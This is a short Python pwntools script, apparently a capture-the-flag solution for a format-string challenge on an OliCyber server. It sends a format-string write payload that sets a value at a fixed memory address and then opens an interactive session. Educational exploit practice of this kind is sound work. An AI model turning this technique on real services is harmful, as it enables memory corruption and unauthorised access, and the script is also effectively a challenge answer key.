#!/usr/bin/env python3

from pwn import *
context.arch = "amd64"

HOST = "formatted.challs.olicyber.it"
PORT = 10305
r = remote(HOST, PORT)

print(r.recvline())
r.sendline(fmtstr_payload(6, {0x40404c: 1}))
r.interactive()
r.close()